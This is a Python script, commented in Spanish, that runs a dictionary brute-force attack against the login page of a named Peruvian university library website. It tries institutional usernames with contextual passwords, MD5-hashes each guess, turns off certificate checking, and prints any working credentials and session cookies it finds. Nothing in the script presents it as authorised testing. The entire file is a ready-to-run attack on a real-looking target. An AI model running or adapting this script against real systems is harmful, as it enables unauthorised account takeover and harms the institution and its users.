import requests, urllib3, re, hashlib
urllib3.disable_warnings()

BASE = "https://biblioteca.uns.edu.pe"
h = {'User-Agent': 'Mozilla/5.0'}

print("="*60)
print("BRUTE FORCE INTELIGENTE: login.asp")
print("Contexto: universidad peruana, palabras clave institucionales")
print("="*60)

# Combinaciones contextuales mas probables para sistema de biblioteca universitaria
# Logica: usuario = nombre del sistema / cargo
# Clave = nombre + numeros / año / nombre institucional

users = ['admin', 'biblio', 'biblioteca', 'ocid', 'bib', 'catalogo', 'uns']
# Passwords contextuales con y sin MD5
passwords_raw = [
    'admin', 'admin123', 'admin2024', 'admin2025', 'admin2026',
    '123456', '12345678', '123456789', 'password', 'password123',
    'biblioteca', 'biblioteca123', 'biblio', 'biblio123',
    'uns', 'uns2024', 'uns2025', 'uns2026', 'UNS2026',
    'ocid', 'ocid123', 'central', 'chimbote',
    'sistemas', 'otic', 'informatica',
    'Aa123456', 'Admin123', 'Admin@123',
    'cambiar', 'Cambiar123', 'temporal', 'Temporal123',
]

session = requests.Session()
session.verify = False

found = False
total = len(users) * len(passwords_raw)
count = 0

for usr in users:
    for pwd in passwords_raw:
        count += 1
        md5pass = hashlib.md5(pwd.encode()).hexdigest()
        data = {'t_usuario': usr, 't_clave': md5pass, 'modo': 'U', 'B1': 'Iniciar Sesion'}
        headers_req = {**h, 'Referer': BASE + '/inicia_sesion.asp'}
        
        try:
            r = session.post(BASE + '/login.asp', data=data, headers=headers_req, timeout=6, allow_redirects=True)
            is_fail = 'inicia_sesion' in r.url.lower()
            
            if not is_fail:
                print(f"\n[!!!] CREDENCIALES VALIDAS ENCONTRADAS:")
                print(f"  Usuario: {usr}")
                print(f"  Password: {pwd}")
                print(f"  URL POST-LOGIN: {r.url}")
                print(f"  Cookies: {dict(session.cookies)}")
                print(f"  Response len: {len(r.content)}")
                found = True
                break
            else:
                if count % 20 == 0:
                    print(f"  [{count}/{total}] Probando {usr}:{pwd}... fail")
        except Exception as e:
            print(f"  ERROR en {usr}:{pwd}: {e}")
    
    if found:
        break

if not found:
    print(f"\n[--] Completado: {count} combinaciones. Sin credenciales validas.")
